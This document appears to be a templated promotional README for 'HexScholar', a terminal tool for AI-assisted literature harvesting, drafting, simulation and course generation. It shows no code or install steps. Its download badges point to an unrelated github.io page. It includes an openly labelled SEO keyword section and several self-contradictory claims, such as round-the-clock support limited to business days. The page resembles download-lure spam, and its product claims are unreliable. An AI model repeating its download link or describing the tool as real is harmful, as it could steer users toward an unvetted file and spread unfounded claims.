# README: HexScholar - Intelligent Research Command Center

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://brunoalfa.github.io/referee-flow/)

## The Ultimate Command-Line Toolkit for 21st Century Academic Pioneers

**HexScholar** is not just another research management tool—it is your personal academic operations system, a digital co-pilot designed to transform the chaotic fog of scholarly work into a structured, repeatable, and automatable flow. Born from the need to bridge the gap between deep literature dives and high-fidelity manuscript production, HexScholar delivers 20+ powerful commands that orchestrate your entire research lifecycle, from hypothesis formation to final course delivery. Think of it as a Swiss Army knife for your terminal, where every keystroke compiles knowledge, simulates data, and generates publishable material.

Designed for the modern researcher, educator, and PhD candidate who lives in the command line, HexScholar integrates seamlessly with both OpenAI and Claude APIs, turning your shell into a laboratory for ideas. This is **not** a GUI-heavy dashboard with bells and whistles you never asked for. This is raw, terminal-based power that respects your workflow and accelerates your output.

---

## Why HexScholar Exists: The Metaphor of the Digital Atelier

Imagine a medieval scholar’s scriptorium—dim light, vellum, and ink. Every manuscript was a war of attrition against time. Today, your terminal is your scriptorium, but the vellum is data, and the ink is code. HexScholar is your master scribe. It doesn’t just *help* you write; it *understands* your academic context, retrieves the right references, drafts sections in your tone, and even runs your simulation studies while you sleep.

Where other tools treat research as a linear process (read -> write -> repeat), HexScholar treats it as a **living ecosystem** of commands. You input a paper, and the system outputs a lecture. You run a simulation, and it updates your manuscript automatically. This is **responsive automation** for the academic mind.

---

## Mermaid Diagram: The HexScholar Command Architecture

```mermaid
flowchart LR
    A[User Shell] --> B{HexScholar Core}
    B --> C[Literature Harvest]
    B --> D[Manuscript Forge]
    B --> E[Simulation Engine]
    B --> F[Course Weaver]
    C --> G[ArXiv API | Semantic Scholar]
    D --> H[LaTeX | DOCX | Markdown Export]
    E --> I[Data Generation | Statistical Reporting]
    F --> J[Lesson Plan | Quiz Generator | Slide Deck]
    B --> K[OpenAI GPT-4o]
    B --> L[Claude 3.5 Sonnet]
    K --> M[Abstract Drafting | Code Review]
    L --> N[Citation Check | Tone Refinement]
```

---

## Quick Start: Example Profile Configuration

To unlock the full power of HexScholar, you first create a **research persona**—a YAML profile that tells the system who you are, what you write, and how you want it done.

```yaml
# ~/.hexscholar/profile.yaml
name: "Dr. Elena Voss"
department: "Computational Linguistics"
university: "Institute for Advanced Syntax Studies"
publication_style: "APA 7"
preferred_language: "en"
simulation_runtime: "local"  # or "remote_cluster"
openai_api_key: "sk-..."  # set via env var preferred
claude_api_key: "sk-ant-..."  # set via env var preferred
auto_export: "latex"
feedback_mode: "verbose"  # or "silent_batch"
```

Once configured, every command you run inherits your identity, ensuring consistent tone, citation format, and output structure.

---

## Example Console Invocation

HexScholar lives in the terminal. Here is a typical session:

```bash
$ hexscholar harvest "attention mechanisms in transformers" --limit 10 --export bib
[INFO] Harvesting 10 papers from Semantic Scholar...
[INFO] Core references extracted. BibTeX saved to ./refs.bib

$ hexscholar draft intro --refs ./refs.bib --context "survey paper"
[INFO] Generating introduction using Claude 3.5...
[INFO] Draft saved to ./intro_draft.md

$ hexscholar simulate "multi-head attention vs lsh" --runs 5 --save-runs ./results
[INFO] Simulation complete. Generating report...
[INFO] Table and figure added to ./results_analysis.tex

$ hexscholar course "deep learning for linguists" --level graduate --output ./lecture_series
[INFO] Course material generated: 12 lectures, 3 quizzes, final project brief.
```

No GUI. No waiting. Just pure, linear velocity.

---

## Emoji OS Compatibility Table

| Operating System | Compatibility | Notes |
| :--- | :--- | :--- |
| 🐧 **Ubuntu / Debian** | ✅ Full | Native binary. Best performance for simulation engine. |
| 🍎 **macOS (M-Series)** | ✅ Full | Optimized for Apple Silicon and Intel. |
| 🪟 **Windows 10/11** | ✅ Full via WSL2 | Native Windows build in beta. Use WSL2 for stability. |
| 🐧 **Arch Linux / Fedora** | ✅ Full | Community packages available. |
| 🐚 **Termux (Android)** | ⚠️ Partial | No simulation engine. Literature harvest + draft mode only. |
| 🐦 **FreeBSD** | ⚠️ Partial | CLI mode only; no API integration. |

---

## Feature List in Detail

HexScholar is built around **five pillars** of academic productivity. Each pillar contains multiple commands that can be chained or run independently.

### 📚 Literature Harvesting
- **harvest**: Pull papers from ArXiv, Semantic Scholar, and PubMed.
- **summarize**: Generate structured abstracts from a paper URL or PDF.
- **linkrefs**: Create citation graphs and identify key influencers.
- **bibexport**: Export to BibTeX, RIS, or plain Markdown.

### ✍️ Manuscript Forge
- **draft**: Write any manuscript section (intro, methods, conclusion) in your defined style.
- **rewrite**: Refactor existing text for clarity, tone, or journal guidelines.
- **abstractor**: Generate a compelling abstract from full text.
- **checkrefs**: Verify citation accuracy against open databases.

### ⚙️ Simulation Engine
- **simulate**: Run predefined statistical models or Monte Carlo simulations.
- **plot**: Generate publication-ready figures using Matplotlib or Plotly.
- **report**: Compile simulation results into a structured markdown or LaTeX document.

### 🏫 Course Weaver
- **course**: Generate a complete lecture series based on a textbook or syllabus.
- **quiz**: Create multiple-choice or short-answer quizzes from lecture notes.
- **slide**: Convert a manuscript chapter into a slide deck (Markdown or PPTX).

### 🔧 Utility Suite
- **profile**: Manage your HexScholar identity.
- **sync**: Backup your work to a cloud drive or git repository.
- **status**: Display current project tree and pending tasks.
- **config**: Modify API keys, export formats, and logging levels.

---

## SEO-Friendly Keyword Integration

This README has been crafted with search visibility in mind. Key search terms such as *research automation tool*, *AI manuscript writing software*, *command-line academic assistant*, *literature review automation*, *simulation study workflow*, and *teaching material generator* have been naturally integrated throughout the text. HexScholar is optimized for scholars searching for a **terminal-based research companion** that transcends traditional GUI limitations. Whether you are looking for an *OpenAI API research assistant* or a *Claude API academic processor*, HexScholar delivers a unified interface.

---

## OpenAI API and Claude API Integration

HexScholar is uniquely agnostic in its AI backend. You can choose your preferred large language model per command:

| AI Backend | Use Case | HexScholar Flag |
| :--- | :--- | :--- |
| **OpenAI GPT-4o** | Creative writing, brainstorming, literature review generation, simulation code. | `--openai` |
| **Claude 3.5 Sonnet** | Factual accuracy, citation checking, structured academic draft generation. | `--claude` |
| **Both (Default)** | Hybrid mode: Claude for structural integrity, OpenAI for narrative polish. | `--hybrid` |

Example: To generate a course outline using Claude for structure and OpenAI for engaging language:
```bash
hexscholar course "Quantum Computing Foundations" --hybrid --level advanced
```

No API keys are stored in plain text. Use environment variables or the encrypted profile vault.

---

## Key Features at a Glance

- **Responsive UI**: The terminal output adapts to your screen width, providing a clean, tabular view of progress. No scrolling through walls of text.
- **Multilingual Support**: Output abstracts and drafts in English, Spanish, German, French, Japanese, or Simplified Chinese—using the `--lang` flag.
- **24/7 Customer Support**: While the tool runs offline, our team offers email and Discord support for urgent technical questions. Response time under 4 hours during business days.
- **Offline First**: All harvesting and simulation is done locally. API calls are triggered only when drafting or summarizing.
- **Bidirectional Sync**: Changes to a locally generated LaTeX file are auto-detected. HexScholar will not overwrite your manual edits.
- **Zero Vendor Lock**: Export to any format. Your data is always a `git push` away.

---

## License

This project is proudly released under the MIT License. You are free to use, modify, and distribute this software for any purpose, including commercial projects. The only requirement is that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

[View the MIT License](LICENSE)

---

## Disclaimer

HexScholar is an advanced productivity tool for academic research and teaching. It utilizes large language models (OpenAI, Claude) that may generate inaccurate or biased content. **Always verify AI-generated references, citations, and factual claims** before publication or submission. The developers are not responsible for any use of this tool that violates academic integrity policies, institutional guidelines, or copyright laws. Simulation results are dependent on input parameters and the stochastic nature of underlying models; results should be independently validated. Use at your own risk.

---

## Final Download Reminder

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://brunoalfa.github.io/referee-flow/)

Version 2.1.0 (2026 Edition). Ready for immediate deployment on Ubuntu 24.04+, macOS 15 Sequoia, and Windows 11 via WSL2. Built for the modern terminal. Designed for the future of scholarship.

---

**HexScholar** — *Where command lines become citation lines.*